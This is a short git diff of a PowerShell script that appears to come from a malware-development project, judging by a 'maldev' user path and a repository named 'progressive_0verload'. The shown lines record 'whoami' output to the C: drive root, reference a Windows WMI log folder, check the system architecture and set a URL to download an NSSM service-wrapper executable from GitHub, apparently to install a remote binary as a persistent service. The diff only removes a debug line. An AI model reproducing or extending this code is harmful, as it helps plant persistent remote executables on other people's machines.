@@ -10,7 +10,7 @@ $paths = @(
     "$env:windir\System32\LogFiles\WMI"
 )
 whoami | Out-File "C:\init_service_fwd.txt"
-echo $basePath >> "C:\Users\maldev\Downloads\init_fwd.txt"
+
 $arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
 if($arch -eq "64-bit"){
     $nssmUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/nssmx64.exe"
